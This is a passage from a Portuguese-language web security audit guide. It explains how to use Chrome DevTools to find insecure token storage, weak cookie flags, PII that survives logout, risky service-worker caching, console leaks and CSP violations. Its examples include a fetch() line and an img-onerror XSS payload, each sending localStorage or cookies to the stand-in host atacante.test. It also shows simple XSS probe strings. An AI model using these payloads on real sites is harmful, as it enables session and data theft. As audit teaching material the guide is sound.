Cookie: __Host-sid=8f3a9b1c2d4e5f6a7b8c9d0e1f2a3b4c

# Response Headers (VULNERÁVEL — Reflexão de Origin com Credenciais)
HTTP/2 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://parceiro-nao-confiavel.test
Access-Control-Allow-Credentials: true
```

**Diagnóstico**: O servidor copiou cegamente o header `Origin` da requisição para o header `Access-Control-Allow-Origin` da resposta junto com `Access-Control-Allow-Credentials: true`. Qualquer site externo pode ler o saldo e os dados da carteira do usuário logado.

---

<a id="s6-2"></a>
### 6.2 Auditoria na Aba Application

Enquanto a aba **Network** examina os dados *em trânsito*, a aba **Application** ([Seção 2.2](./02b-devtools-application.md#s2-2)) audita os dados **em repouso no navegador do cliente** e os mecanismos de execução em segundo plano. Tudo o que é gravado em **Local Storage**, **Session Storage**, **IndexedDB**, **Cache Storage** ou em cookies sem a flag `HttpOnly` fica diretamente acessível a qualquer código JavaScript que rode na mesma origem — incluindo scripts de bibliotecas de terceiros comprometidas (*Supply Chain Attack*) ou payloads injetados por meio de XSS.

<a id="s6-2-1"></a>
#### 6.2.1 Existem tokens sensíveis armazenados no Local Storage, Session Storage ou IndexedDB?

Armazenar tokens de autenticação de longa duração (*refresh tokens*), tokens de sessão (JWT) ou chaves secretas de API no **Web Storage** (`localStorage` e `sessionStorage`) ou no **IndexedDB** é um dos erros arquiteturais mais frequentes em aplicações SPA modernas. Diferentemente dos cookies `HttpOnly`, essas APIs de armazenamento foram projetadas especificamente para serem lidas e modificadas via JavaScript.

##### Como verificar passo a passo

1. Abra o Chrome DevTools, clique na aba **Application** e localize a seção **Storage** na barra lateral esquerda.
2. Expanda **Local Storage** e clique sobre a origem da aplicação (ex.: `https://loja-ficticia.test`). Caso existam `<iframe>` de outras origens na página, clique também nas origens secundárias listadas.
3. Examine todas as linhas da tabela **Key** / **Value**. Clique em cada linha para visualizar o valor completo ou a árvore JSON decodificada no painel inferior.
4. Repita exatamente o mesmo processo expandindo **Session Storage**.
5. Expanda **IndexedDB**, abra cada banco de dados listado (ex.: `firebaseLocalStorageDb`, `auth_db`, `localforage`), clique nas *Object Stores* internas e inspecione os registros (*Records*) salvos.
6. Caso encontre uma string no formato de três blocos separados por ponto (`xxxxx.yyyyy.zzzzz`), trata-se de um **JWT**: copie a segunda parte (*payload*) e decodifique-a em Base64URL (por exemplo, no próprio Console usando `JSON.parse(atob(token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')))`) para verificar o tempo de expiração (`exp`), o escopo (`scope`/`role`) e se há dados sensíveis embutidos.

##### Resultado esperado (seguro)

- **[RECOMENDAÇÃO]** O `localStorage`, o `sessionStorage` e o `IndexedDB` contêm **apenas estado de interface e preferências não sensíveis**: tema visual (`theme: "dark"`), idioma selecionado (`locale: "pt-BR"`), estado de abertura da barra lateral (`sidebarCollapsed: true`), rascunhos não confidenciais ou controles de exibição de *banners* de consentimento.
- **[RECOMENDAÇÃO]** Credenciais de sessão e *refresh tokens* residem em **cookies `HttpOnly`, `Secure` e `SameSite`** (gerenciados por um padrão **BFF** — *Backend For Frontend*) ou, no caso de *access tokens* de curtíssima duração (ex.: 5 minutos), são mantidos apenas em variáveis em memória do JavaScript (*closures* / estado volátil não persistido em disco).

##### Sinais de alerta (inseguro)

- Chaves como `token`, `access_token`, `id_token`, `refresh_token`, `jwt`, `auth_storage`, `supabase.auth.token` ou `firebase:authUser` persistidas em `localStorage` ou `IndexedDB`.
- *Tokens* JWT armazenados no `localStorage` sem o claim de expiração `exp` ou com validade de semanas/meses.
- Senhas em texto claro, PINs bancários ou chaves privadas de API (`sk_live_...`, `AWS_SECRET_ACCESS_KEY`) salvas em qualquer mecanismo de armazenamento do navegador.

##### Exemplo prático

Ao inspecionar **Application** -> **Storage** -> **Local Storage** -> `https://app.loja-ficticia.test`, o auditor encontra os seguintes pares chave-valor:

```text
Key                        Value
---------------------------------------------------------------------------------------------------------
ui_theme                   "dark"
@LojaFicticia:token        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTk5OTk5OTk5OX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
@LojaFicticia:refreshToken "rt_99887766554433221100aabbccddeeff"
```

**Diagnóstico**: Tanto o JWT de administrador (`"role": "admin"`) quanto o `refreshToken` estão gravados em `localStorage`. Se um atacante encontrar qualquer ponto de XSS na aplicação ou comprometer um pacote NPM (*Node Package Manager*) de terceiros carregado na página, um único comando `fetch('https://atacante.test/roubo?d=' + encodeURIComponent(JSON.stringify(localStorage)))` exfiltrará ambos os tokens instantaneamente, garantindo acesso persistente à conta administrativa mesmo após a vítima fechar o navegador.

---

<a id="s6-2-2"></a>
#### 6.2.2 Os cookies estão configurados corretamente na tabela de Cookies?

Enquanto a aba **Network** mostra os cabeçalhos `Set-Cookie` de cada resposta individual, a tabela **Cookies** na aba **Application** ([Seção 2.2.5](./02b-devtools-application.md#s2-2)) apresenta o **inventário consolidado e ativo** de todos os cookies atualmente armazenados no navegador para cada origem, incluindo cookies criados via JavaScript (`document.cookie = ...`) que jamais apareceram em cabeçalhos HTTP na aba **Network**.

##### Como verificar passo a passo

1. Na aba **Application**, expanda **Storage** -> **Cookies** na barra lateral esquerda e selecione a origem da aplicação (ex.: `https://loja-ficticia.test`).
2. Analise sistematicamente todas as colunas da tabela para cada cookie listado:
   - **Name**: identifique a finalidade do cookie (sessão, CSRF, rastreamento/analytics, preferências) e verifique o uso dos prefixos `__Host-` ou `__Secure-`.
   - **Value**: verifique se o valor é um identificador pseudoaleatório opaco com alta entropia ou se contém dados estruturados/previsíveis (ex.: `user_id=105` ou `is_admin=true` sem assinatura criptográfica).
   - **Domain** e **Path**: avalie o escopo de envio. Um `Domain` iniciado por ponto (como `.loja-ficticia.test`) compartilha o cookie com todos os subdomínios; um `Domain` sem ponto inicial (definido por omissão como *host-only*) restringe o cookie ao host exato.
   - **Expires / Max-Age**: verifique se cookies de sessão sensíveis expiram ao fechar o navegador (`Session`) ou em poucas horas, ou se possuem datas de expiração anos no futuro.
   - **HttpOnly**: verifique se há o símbolo de confirmação (`✓`) nos cookies de sessão.
   - **Secure**: verifique se há o símbolo de confirmação (`✓`) em **todos** os cookies servidos em ambiente HTTPS.
   - **SameSite**: verifique se está preenchido com `Strict` ou `Lax` (e questione qualquer ocorrência de `None`).
   - **Partitioned** / **Partition Key** (`[Varia por versão]`): em cookies de terceiros legítimos que usam **CHIPS** (*Cookies Having Independent Partitioned State*), confirme se o particionamento por site de nível superior (*top-level site*) está ativo.
3. Abra o Drawer do Console (`Esc`) enquanto visualiza a aba **Application** e digite `document.cookie` para comprovar na prática quais cookies da tabela são visíveis ao JavaScript.

##### Resultado esperado (seguro)

- **[REQUISITO]** Cookies de autenticação/sessão possuem `✓` em **HttpOnly**, `✓` em **Secure**, **SameSite** definido como `Lax` ou `Strict`, escopo *host-only* (idealmente com prefixo `__Host-` e `Path=/`) e valor com alta entropia (pelo menos 128 bits gerados por **CSPRNG** — *Cryptographically Secure Pseudo-Random Number Generator*).
- **[REQUISITO]** Ao executar `document.cookie` no Console, o identificador de sessão **não** aparece na string retornada.

##### Sinais de alerta (inseguro)

- Colunas **HttpOnly** e **Secure** em branco nos cookies `connect.sid`, `JSESSIONID`, `PHPSESSID`, `laravel_session` ou `auth_token`.
- Cookies controlando autorização em texto claro ou Base64 simples sem assinatura: ex.: cookie `role` com valor `YWRtaW4=` (`admin` em Base64), permitindo que o próprio usuário dê duplo clique na célula **Value** da aba **Application**, altere o valor, recarregue a página (`F5`) e ganhe privilégios administrativos (**Broken Access Control**).
- Cookies com identificadores sequenciais (`session_id=10042`), permitindo sequestro de sessão por força bruta (**Session Hijacking**).

##### Exemplo prático

Tabela observada em **Application** -> **Cookies** -> `https://loja-ficticia.test`:

| Name | Value | Domain | Path | Expires / Max-Age | HttpOnly | Secure | SameSite |
| :--- | :--- | :--- | :--- | :--- | :---: | :---: | :--- |
| `__Host-sess` | `9a8f...3e1b` (64 hex) | `loja-ficticia.test` | `/` | `Session` | `✓` | `✓` | `Lax` |
| `perfil_acesso` | `cliente_comum` | `.loja-ficticia.test` | `/` | `2027-10-30T...` | *(vazio)* | *(vazio)* | *(vazio)* |
| `rastreador_id` | `uid_8812` | `.loja-ficticia.test` | `/` | `2028-01-01T...` | *(vazio)* | `✓` | `None` |

**Diagnóstico**: Enquanto o cookie `__Host-sess` está exemplarmente configurado, o cookie `perfil_acesso` representa um grave sinal de alerta: não possui `HttpOnly` nem `Secure`, abrange todos os subdomínios (`.loja-ficticia.test`) e aparenta armazenar o nível de permissão do usuário no cliente. O auditor deve testar em laboratório se alterar `perfil_acesso` para `admin` diretamente na tabela do DevTools altera o comportamento do servidor.

---

<a id="s6-2-3"></a>
#### 6.2.3 Existem informações pessoais (PII) desnecessárias persistidas no cliente?

Sob a ótica da privacidade por design (*Privacy by Design*) e de legislações como a **LGPD** (Lei Geral de Proteção de Dados Pessoais — Lei nº 13.709/2018) e o **GDPR** (*General Data Protection Regulation* europeu), o navegador do cliente é um ambiente hostil e potencialmente compartilhado (computadores de bibliotecas universitárias, laboratórios de informática, postos de atendimento ou dispositivos familiares). Persistir dados pessoais no armazenamento local faz com que essas informações permaneçam gravadas em disco mesmo após o usuário encerrar sua sessão (*logout*), caso a aplicação não execute uma limpeza completa.

##### Como verificar passo a passo

1. Realize login na aplicação com uma conta de teste e navegue pelas páginas de "Minha Conta", "Meus Pedidos", "Endereços" e "Pagamento".
2. Na aba **Application**, inspecione **Local Storage**, **Session Storage** e **IndexedDB** procurando objetos serializados de gerenciamento de estado global (muito comuns ao usar bibliotecas como `redux-persist`, `vuex-persistedstate` ou `zustand/persist`, que frequentemente salvam toda a árvore de estado na chave `persist:root`).
3. Em seguida, clique no botão **Sair (Logout)** da aplicação.
4. Volte imediatamente à aba **Application** e verifique se as chaves em **Local Storage**, **Session Storage**, **IndexedDB** e **Cookies** foram efetivamente apagadas ou se os dados pessoais do usuário anterior continuam intactos no navegador.
5. Na aba **Network**, verifique se a resposta da requisição de `POST /logout` enviou o cabeçalho `Clear-Site-Data: "cache", "cookies", "storage"`.

##### Resultado esperado (seguro)

- **[REQUISITO]** Nenhuma informação pessoal sensível (CPF, RG, data de nascimento completa, endereço residencial, histórico médico, dados bancários ou últimos dígitos + validade + nome do titular do cartão) é persistida em `localStorage` ou `IndexedDB` sem necessidade estrita de funcionamento *offline* explícito e criptografado.
- **[REQUISITO]** No momento do *logout*, a aplicação invalida a sessão no servidor, remove os cookies de autenticação, limpa o armazenamento local (`localStorage.clear()`, `sessionStorage.clear()`, deleção de bancos IndexedDB) e, idealmente, responde com o cabeçalho HTTP `Clear-Site-Data: "cache", "cookies", "storage"`.

##### Sinais de alerta (inseguro)

- A chave `persist:root` ou `current_user` continua no `localStorage` após o *logout*, contendo o JSON completo do último usuário logado (nome completo, CPF, endereço, telefone, lista de compras recentes).
- Formulários de checkout salvando rascunhos automáticos dos dados do cartão de crédito (`card_number`, `cvv`) no `sessionStorage` ou `localStorage`.

##### Exemplo prático

Após o usuário clicar em "Sair" em um computador compartilhado do laboratório da universidade, o próximo estudante abre o DevTools em **Application** -> **Local Storage** e encontra:

```json
// Chave: "persist:userStore" (permaneceu gravada após o logout!)
{
  "profile": "{\"id\":904,\"nome\":\"Carlos Eduardo Souza\",\"cpf\":\"987.654.321-11\",\"email\":\"carlos@exemplo.test\",\"endereco\":\"Rua das Flores, 123, Apto 45\",\"cartaoSalvo\":{\"final\":\"4321\",\"bandeira\":\"VISA\",\"limiteDisponivel\":14500.00}}",
  "isAuthenticated": "false"
}
```

**Diagnóstico**: O código de logout apenas alterou a flag `"isAuthenticated": "false"` no gerenciador de estado, mas esqueceu de purgar o objeto `profile` persistido no `localStorage` e não enviou o header `Clear-Site-Data`. Qualquer pessoa que utilizar a mesma máquina a seguir tem acesso integral aos dados pessoais e financeiros do usuário anterior.

---

<a id="s6-2-4"></a>
#### 6.2.4 O Service Worker apresenta comportamento esperado e seguro?

Um **Service Worker** ([Seção 2.2.1](./02b-devtools-application.md#s2-2) e [Seção 2.2.7](./02b-devtools-application.md#s2-2)) é um script JavaScript especializado que o navegador executa em segundo plano, separado da página web, funcionando como um **proxy de rede programável no cliente**. Ele tem poder para interceptar, modificar, fabricar ou armazenar em cache toda requisição HTTP originada dentro do seu escopo (`scope`). Por essa razão, os navegadores só permitem o registro de Service Workers em contextos seguros (`https://` ou `localhost`). Se um Service Worker for registrado de maneira insegura ou sofrer injeção de script, um atacante conquista persistência de longo prazo no navegador da vítima.

##### Como verificar passo a passo

1. Na aba **Application**, clique em **Service Workers** dentro do grupo **Application** na barra lateral esquerda.
2. Verifique se existe algum Service Worker ativo (`Status: #... activated and is running`) para a origem atual.
3. Observe os metadados críticos:
   - **Source**: qual é o arquivo JavaScript do Service Worker (ex.: `sw.js` ou `service-worker.js`)? Clique no link do arquivo para abrir seu código-fonte na aba **Sources**.
   - **Scope**: qual é o escopo de interceptação (ex.: `https://loja-ficticia.test/` intercepta o domínio inteiro, enquanto `https://loja-ficticia.test/app/` intercepta apenas `/app/`)?
4. No código do Service Worker aberto na aba **Sources**, procure pelo ouvinte `self.addEventListener('fetch', ...)` e verifique quais URLs são interceptadas e armazenadas em cache.
5. Verifique na aba **Network** (filtrando pela requisição que baixa o `sw.js`) se o arquivo do Service Worker nunca é cacheado por tempo excessivo de forma imutável e se o endpoint que serve o `sw.js` não aceita parâmetros controlados pelo usuário (como *callbacks* JSONP).

##### Resultado esperado (seguro)

- **[REQUISITO]** O script do Service Worker é servido a partir da própria origem sobre HTTPS, sem aceitar parâmetros dinâmicos na URL que permitam injeção de código no corpo do arquivo JavaScript.
- **[RECOMENDAÇÃO]** O ouvinte `fetch` do Service Worker faz *cache* apenas de ativos estáticos públicos (arquivos `.js`, `.css`, fontes, ícones, imagens do layout, páginas de fallback *offline*), ignorando explicitamente (`return;` sem `event.respondWith`) requisições de autenticação, chamadas `POST`/`PUT`/`DELETE` e endpoints `/api/` que retornam dados privados.
- **[BOA PRÁTICA]** Quando o usuário realiza *logout*, a aplicação limpa os caches privados do Service Worker ou envia uma mensagem via `navigator.serviceWorker.controller.postMessage({ action: 'CLEAR_USER_CACHE' })`.

##### Sinais de alerta (inseguro)

- O Service Worker intercepta todas as requisições `GET /api/*` e aplica uma estratégia *Cache First* ou *Stale-While-Revalidate* sem limpar o cache no *logout*, fazendo com que dados da conta antiga continuem sendo servidos localmente mesmo após a troca de usuário.
- O arquivo do Service Worker importa scripts externos de domínios de terceiros sem controle via `importScripts('https://cdn-duvidosa.test/plugin-sw.js')`.

##### Exemplo prático

Ao inspecionar **Application** -> **Service Workers**, o auditor vê `sw.js` ativo no escopo raiz `https://ibank.exemplo.test/`. Clicando em `sw.js`, encontra o seguinte trecho:

```javascript
// CÓDIGO INSEGURO DENTRO DE sw.js
self.addEventListener('fetch', (event) => {
  // ERRO GRAVE: Cacheia QUALQUER requisição GET, incluindo /api/extrato e /api/dados-pessoais!
  if (event.request.method === 'GET') {
    event.respondWith(
      caches.open('ibank-v1').then(async (cache) => {
        const cachedResponse = await cache.match(event.request);
        if (cachedResponse) return cachedResponse;
        const networkResponse = await fetch(event.request);
        cache.put(event.request, networkResponse.clone());
        return networkResponse;
      })
    );
  }
});
```

**Diagnóstico**: O Service Worker está gravando respostas autenticadas (`/api/extrato`) permanentemente no **Cache Storage** do navegador.

---

<a id="s6-2-5"></a>
#### 6.2.5 Há dados sensíveis armazenados em Cache Storage ou HTTP Cache?

Complementando a análise do Service Worker e dos cabeçalhos HTTP, é essencial verificar se respostas contendo informações confidenciais ficaram retidas no **Cache Storage** (controlado via JavaScript pela Cache API, geralmente por um Service Worker) ou no **HTTP Cache** (Disk Cache / Memory Cache nativo do navegador).

##### Como verificar passo a passo

1. Na aba **Application**, expanda **Storage** -> **Cache storage** na barra lateral esquerda.
2. Clique em cada nome de cache listado (ex.: `workbox-precache-v2`, `runtime-cache`, `api-cache`).
3. Percorra a tabela de recursos armazenados (**Name**, **Response-Type**, **Content-Type**, **Content-Length**, **Time Cached**).
4. Clique em qualquer entrada que represente uma rota de API (`application/json`) ou página HTML dinâmica e examine as sub-abas **Headers** e **Preview** no painel inferior para ver exatamente o que está gravado em disco.
5. Para auditar o **HTTP Cache** nativo:
   - Realize login, acesse uma página com dados sensíveis (ex.: faturas, prontuário, extrato) e depois faça *logout*.
   - Com a aba **Network** aberta (e **Disable cache** **desmarcado** para simular o comportamento real do usuário), clique no botão **Voltar** (*Back*) do navegador ou refaça uma requisição e verifique na coluna **Size** se o navegador exibe `(disk cache)`, `(memory cache)` ou `(from ServiceWorker)` para recursos que deveriam exigir autenticação ativa.
   - Em **Application** -> **Background services** -> **Back/forward cache** (`bfcache`), verifique se páginas altamente confidenciais permanecem congeladas na memória após o *logout*.

##### Resultado esperado (seguro)

- **[REQUISITO]** O **Cache Storage** armazena apenas *assets* estáticos da aplicação (*App Shell*: bundles JS, folhas CSS, imagens de interface, fontes) ou dados públicos.
- **[REQUISITO]** Páginas autenticadas e respostas de APIs privadas utilizam `Cache-Control: no-store, no-cache, must-revalidate, private`, impedindo que sejam gravadas no `(disk cache)` e impedindo que o botão "Voltar" do navegador exiba dados confidenciais após o encerramento da sessão.

##### Sinais de alerta (inseguro)

- Entradas como `/api/v1/clientes/me/cartoes` ou `/api/v1/prontuario-medico` visíveis e legíveis dentro de **Application** -> **Cache storage** mesmo com o usuário deslogado.
- Coluna **Size** na aba **Network** indicando `(disk cache)` para endpoints autenticados sem revalidação no servidor.

##### Exemplo prático

Em **Application** -> **Cache storage** -> `api-runtime-cache`, o auditor clica na linha `/api/v1/paciente/exames` e visualiza na sub-aba **Preview** o resultado completo de exames laboratoriais do paciente anterior, com `Response-Type: basic` e `Status: 200`, persistido em disco porque o Service Worker interceptou a requisição e o servidor enviou `Cache-Control: max-age=86400`.

---

<a id="s6-3"></a>
### 6.3 Auditoria na Aba Console

A aba **Console** ([Seção 2.3](./02c-devtools-console.md#s2-3)) atua simultaneamente como um **coletor central de eventos de diagnóstico** (mensagens geradas pelo código da aplicação via `console.*` e avisos/erros nativos emitidos pelo próprio motor do navegador — Blink/V8) e como um **terminal interativo (REPL)** capaz de interagir em tempo real com os objetos `window`, `document` e o escopo JavaScript da página. Durante uma auditoria de segurança, o Console revela desde vazamentos acidentais deixados por desenvolvedores até bloqueios ativos de políticas de segurança e falhas lógicas de controle de acesso no front-end.

<a id="s6-3-1"></a>
#### 6.3.1 Existem erros que revelam informações internas ou stack traces?

Exceções JavaScript não tratadas (`Uncaught Error`, `Unhandled Promise Rejection`) e respostas de erro de API despejadas no Console frequentemente expõem caminhos internos de diretórios do projeto, nomes de componentes administrativos ocultos, estrutura de estados internos e versões exatas de bibliotecas.

##### Como verificar passo a passo

1. Abra a aba **Console** no Chrome DevTools e clique no ícone de engrenagem (**Console settings**, no canto superior direito da aba) para marcar **Preserve log** (Preservar registro), **Log XMLHttpRequests** e **Show CORS errors in console**.
2. No menu suspenso de níveis (**Default levels**), certifique-se de que **Errors** e **Warnings** estão selecionados (ou clique na barra lateral do Console — **Show console sidebar** — e filtre especificamente por **Errors**).
3. Interaja com a aplicação provocando tanto fluxos normais quanto situações de borda: envie formulários com campos vazios ou caracteres especiais, acesse uma rota inexistente (`/pagina-que-nao-existe`), desligue temporariamente a rede (*Offline* na aba Network) ou simule respostas de erro.
4. Quando um erro vermelho aparecer no Console, clique na seta `▶` à esquerda da mensagem para expandir o **stack trace** (rastreamento da pilha de chamadas) completo e observe os nomes de arquivos e linhas à direita (ex.: `AuthService.ts:88`).

##### Resultado esperado (seguro)

- **[RECOMENDAÇÃO]** A aplicação utiliza tratadores globais de erro (*Error Boundaries* no React, `app.config.errorHandler` no Vue, blocos `try/catch` em funções `async/await` e `window.addEventListener('unhandledrejection', ...)`) que capturam falhas inesperadas de maneira elegante, exibem uma mensagem amigável ao usuário na interface e enviam a telemetria técnica de forma silenciosa para um serviço seguro de monitoramento no servidor, sem despejar objetos internos brutos no Console.
- **[BOA PRÁTICA]** Os bundles JavaScript em produção estão minificados e sem *Source Maps* públicos acessíveis a usuários anônimos, evitando a exposição da estrutura original de pastas de desenvolvimento (`webpack:///./src/internal/admin/SecretPricingEngine.ts`).

##### Sinais de alerta (inseguro)

- Mensagens `Uncaught (in promise) AxiosError: Request failed with status code 500` que imprimem no Console todo o objeto `error.response.data`, incluindo queries SQL ou stack traces do servidor back-end.
- Stack traces no Console apontando para arquivos com nomes reveladores de rotas ou módulos ocultos (ex.: `AdminBypassController.js:14` ou `LegacyPaymentGateway.vue:203`) que permitem a descoberta de *endpoints* não listados no menu principal (*Shadow APIs*).

##### Exemplo prático

Ao tentar aplicar um cupom inválido no carrinho de compras, o Console exibe:

```text
▼ Uncaught (in promise) Error: GraphQL error: Variable "$couponCode" got invalid value; Internal DB error on host pg-prod-cluster-01.internal.loja-ficticia.test:5432 (user: app_rw_prod)
    at new ApolloError (bundle.js:14220:28)
    at Object.next (CheckoutCouponValidator.tsx:67:15)
```

**Diagnóstico**: O erro não tratado revelou que a API utiliza GraphQL, expôs o endereço DNS interno do cluster de banco de dados PostgreSQL de produção (`pg-prod-cluster-01.internal.loja-ficticia.test:5432`), o nome do usuário de banco (`app_rw_prod`) e o arquivo fonte original (`CheckoutCouponValidator.tsx`) graças a um *Source Map* aberto em produção.

---

<a id="s6-3-2"></a>
#### 6.3.2 Há mensagens de log com dados sensíveis, tokens ou credenciais?

Durante o desenvolvimento de funcionalidades complexas (como autenticação OAuth 2.0, integração com gateways de pagamento ou manipulação de formulários), é comum que programadores insiram instruções `console.log("Debug login:", payload)` ou `console.dir(userSession)` para conferir se as variáveis estão preenchidas corretamente. Quando esses comandos não são removidos antes do *deploy* para produção, o Console transforma-se em um canal direto de vazamento de credenciais e PII.

##### Como verificar passo a passo

1. Na aba **Console**, habilite todos os níveis de mensagem no seletor **Levels** (incluindo **Verbose** / `console.debug()`, que muitas vezes fica oculto por padrão!).
2. Com **Preserve log** ativado, execute o fluxo completo de cadastro, login, alteração de senha, edição de perfil e pagamento.
3. Utilize a caixa **Filter** da aba Console para buscar termos críticos: `token`, `bearer`, `jwt`, `password`, `senha`, `secret`, `key`, `cpf`, `card`, `user`, `auth`, `state`, `redux`, `env`.
4. Expanda objetos interativos impressos no Console (`{...}` ou `Object`) e tabelas geradas por `console.table()`, verificando se loggers de bibliotecas de gerenciamento de estado (como `redux-logger` deixado ativo em produção) estão registrando cada ação (`prev state`, `action`, `next state`) com todos os dados digitados pelo usuário.

##### Resultado esperado (seguro)

- **[REQUISITO]** Zero credenciais, senhas, tokens de sessão, chaves de API privadas ou dados pessoais são impressos no Console em ambiente de produção.
- **[BOA PRÁTICA]** O pipeline de *build* de produção utiliza plugins de compilação/empacotamento (como `terser` com `drop_console: true`, `esbuild` com `drop: ['console', 'debugger']` ou regras de linter **ESLint** `no-console: "error"`) para remover automaticamente chamadas `console.log`, `console.debug` e `console.table` do código enviado ao cliente.

##### Sinais de alerta (inseguro)

- Logs de inicialização imprimindo o objeto de configuração completo da aplicação (`console.log("App Config:", import.meta.env)` ou `process.env`), expondo chaves que não deveriam estar no cliente.
- Middleware `redux-logger` ativo em produção imprimindo cada tecla digitada em um campo de senha (`ACTION: AUTH_UPDATE_PASSWORD_FIELD`, `payload: "Senh@Secreta2026"`).
- Impressão do token JWT bruto ou do objeto de resposta do provedor de identidade logo após o login.

##### Exemplo prático

Ao abrir a página de checkout de `loja-ficticia.test` e habilitar o nível **Verbose** no Console, o auditor observa:

```text
[DEBUG] Inicializando SDK de Pagamento...                       payment-init.js:12
▶ { env: "production", publicKey: "pk_live_998877", secretKey: "sk_live_51H8a9B2c3D4e5F6g7H8i9J0k" }
[AUTH] Usuário autenticado com sucesso:                         auth-hook.js:89
▶ { id: 402, email: "cliente@exemplo.test", senhaTextoPlano: "Mudar@123", jwt: "eyJhbGciOi..." }
```

**Diagnóstico**: Dois erros gravíssimos ocorreram simultaneamente:
1. O desenvolvedor colocou a chave secreta administrativa do gateway de pagamento (`sk_live_...`, que jamais pode sair do servidor back-end) em um objeto JavaScript do front-end e ainda a imprimiu via `console.debug`.
2. O hook de autenticação manteve a senha digitada em memória (`senhaTextoPlano`) e a imprimiu no Console após o login.

---

<a id="s6-3-3"></a>
#### 6.3.3 Existem violações de Content Security Policy (CSP)?

O próprio navegador atua como um sensor de auditoria de **Content Security Policy** ([Seção 5.1](./05-headers-de-seguranca.md#s5)) na aba **Console**. Sempre que uma diretiva de CSP bloqueia o carregamento de um recurso ou a execução de um script (ou quando a política está em modo `Content-Security-Policy-Report-Only`), o Chrome registra uma mensagem detalhada no Console explicando exatamente qual diretiva foi violada e qual recurso causou o bloqueio.

##### Como verificar passo a passo

1. Na aba **Console**, filtre por `Content Security Policy`, `Refused to` ou `violates the following`.
2. Analise a natureza da mensagem:
   - Se a mensagem começa com `Refused to execute inline script...` ou `Refused to load the script...`, a política está em modo **ativo de bloqueio** (*enforcement*).
   - Se a mensagem começa com `[Report Only] Refused to...`, a política está apenas em modo de **monitoramento/teste** (`Content-Security-Policy-Report-Only`) e **não está bloqueando o ataque na prática**.
3. Caso você esteja em um laboratório autorizado testando uma possível vulnerabilidade de **XSS** (ex.: inserindo `"><script>console.log(1)</script>` ou `<img src=x onerror=alert(1)>` em um campo de busca), observe o Console: muitas vezes o payload XSS **foi injetado com sucesso no HTML** (confirmando a falha de sanitização/escapamento no código), mas sua execução foi contida em última instância pela CSP do navegador!
4. Verifique também avisos no Console sobre diretivas de CSP inválidas, mal escritas ou ignoradas pelo navegador (ex.: `The source list for Content Security Policy directive 'script-src' contains an invalid source...` ou aviso de que `'unsafe-inline'` foi ignorado na presença de um `'nonce-...'` ou `'sha256-...'`).

##### Resultado esperado (seguro)

- **[REQUISITO]** Nenhuma violação de CSP ocorre durante o uso legítimo da aplicação (indicando que a política está bem calibrada com os *nonces*, hashes ou domínios oficiais necessários).
- **[REQUISITO]** Se um payload de injeção for testado em laboratório, o Console deve registrar imediatamente o bloqueio (`Refused to execute inline script because it violates the following Content Security Policy directive...`), comprovando que a CSP atua como camada efetiva de defesa em profundidade.

##### Sinais de alerta (inseguro)

- Dezenas de erros `[Report Only]` no Console há meses em produção, indicando que a equipe configurou `Content-Security-Policy-Report-Only`, mas nunca corrigiu os scripts legados nem promoveu a política para o cabeçalho bloqueante `Content-Security-Policy`.
- Avisos do Console informando que a sintaxe da CSP enviada pelo servidor contém erros de digitação (por exemplo, escrever `script-src: 'self'` com dois-pontos extras ou esquecer aspas simples em `'self'`, fazendo o navegador procurar um host chamado `self`).

##### Exemplo prático

Durante um teste autorizado em laboratório, o estudante insere `<img src=x onerror="fetch('https://atacante.test/?c='+document.cookie)">` no campo de biografia do usuário. Nenhum alerta visual aparece na tela, mas o Console revela:

```text
Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-8f9e2a1b'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
```

**Diagnóstico**: Esta mensagem no Console é uma descoberta dupla valiosa:
1. Confirma que **existe uma vulnerabilidade de HTML Injection / XSS no código da aplicação** (pois o navegador tentou interpretar o atributo `onerror` da tag `<img>` injetada sem escapamento).
2. Confirma que a **CSP está ativa e bem configurada**, tendo impedido a execução do código malicioso. Ambas as informações devem constar no relatório de auditoria (a falha de sanitização deve ser corrigida no código, mesmo com a CSP bloqueando a exploração imediata).

---

<a id="s6-3-4"></a>
#### 6.3.4 Existem erros de autenticação, autorização ou sessões expiradas mal tratadas?

Muitas falhas de controle de acesso (**Broken Access Control** — [Seção 3.5](./03a-vulnerabilidades-parte1.md#s3)) manifestam-se quando a aplicação web esconde botões ou páginas apenas visualmente no front-end, ou quando o código JavaScript continua disparando requisições em segundo plano (`setInterval` / *polling*) após a expiração da sessão ou em rotas para as quais o usuário não tem permissão.

##### Como verificar passo a passo

1. Na aba **Console** (com **Log XMLHttpRequests** ativado), observe se há erros de rede recorrentes como `GET https://api.loja-ficticia.test/v1/admin/metricas 403 (Forbidden)` ou `401 (Unauthorized)` enquanto você navega como um usuário comum (`role: customer`) ou visitante anônimo.
2. Analise como a aplicação reage quando recebe um `401 Unauthorized`: ela limpa o estado local e redireciona para a tela de login de forma limpa, ou entra em um loop infinito de redirecionamentos/erros no Console?
3. Em ambiente autorizado de laboratório, verifique no Console se o controle de acesso a telas restritas depende apenas de variáveis globais ou propriedades manipuláveis no cliente (ex.: digite `window.__INITIAL_STATE__` ou examine os componentes para ver se o bloqueio de tela é apenas visual enquanto a API não valida permissões).

##### Resultado esperado (seguro)

- **[REQUISITO]** Toda verificação de autenticação (`401`) e autorização (`403`) é obrigatoriamente imposta pelo **servidor back-end** em cada requisição de API; o front-end usa flags de perfil apenas para melhorar a experiência do usuário (**UX** — *User Experience*), ocultando menus irrelevantes.
- **[RECOMENDAÇÃO]** Ao receber `401 Unauthorized` (sessão expirada ou revogada), um interceptador HTTP global no cliente interrompe tarefas de *polling*, limpa dados locais residuais e redireciona o usuário para reautenticação sem gerar uma cascata de exceções não tratadas no Console.

##### Sinais de alerta (inseguro)

- Usuário comum abre a página inicial e o Console já exibe `GET https://api.loja-ficticia.test/v1/admin/usuarios 403 (Forbidden)`: embora o servidor tenha bloqueado a chamada com `403`, o fato de o front-end de um cliente comum tentar chamar a rota `/v1/admin/usuarios` revela a existência e o endereço exato de endpoints administrativos internos.
